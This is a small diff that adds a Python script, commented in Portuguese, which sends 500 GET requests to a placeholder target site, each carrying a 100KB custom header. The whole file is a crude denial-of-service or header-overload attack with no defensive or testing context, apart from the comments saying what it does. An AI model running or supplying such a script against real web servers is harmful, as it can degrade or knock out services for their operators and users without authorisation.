@@ -1,0 +1,8 @@
+import requests
+
+url = "http://site-alvo.com"
+headers = {"X-Custom-Header": "A" * 100000}  # 100KB em um header
+
+# Envia múltiplas vezes
+for _ in range(500):
+    requests.get(url, headers=headers)
